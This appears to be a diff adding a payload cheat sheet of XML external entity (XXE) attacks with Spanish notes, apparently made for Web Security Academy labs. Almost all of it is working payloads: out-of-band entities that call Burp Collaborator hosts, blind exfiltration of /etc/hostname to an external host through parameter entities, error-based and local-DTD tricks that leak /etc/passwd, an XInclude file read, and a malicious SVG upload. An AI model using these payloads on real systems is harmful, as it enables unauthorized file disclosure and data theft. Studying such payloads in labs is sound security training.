@@ -1,0 +1,71 @@
+<!DOCTYPE test2 [ <!ENTITY xxe SYSTEM "http://whatever.burpcollaborator.net"> ]>
+
+
+-----
+
+
+<!DOCTYPE stock [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
+
+
+-----
+
+
+NON ERROR DTD
+
+PARTE 1 --> En el server, sera llamado al inyectar
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfil;
+
+
+PARTE 2 -> En la entrada
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-ace31fe31f740879c0e57f500125001e.web-security-academy.net/exploit"> %xxe;]>
+
+
+------
+
+
+ERROR BASED DTD
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil; 
+
+
+-----
+
+
+XInclude attack
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+
+-----
+IMAGE UPLOAD VULN
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+-----
+CHAINED XXE ENTITIES, basado en generar un error al modificar una entidad ya existente ISOamso (en el fichero usr/share/yelp/dtd/docbookx.dtd), añadiendo el contenido de etcpasswd en una subentidad &#x26 que evalua &#x25 y accede un fichero que no existe, por lo que genera un error y evalua &#x25 que tiene etc/passwd
+
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]> 
+
+
+-----
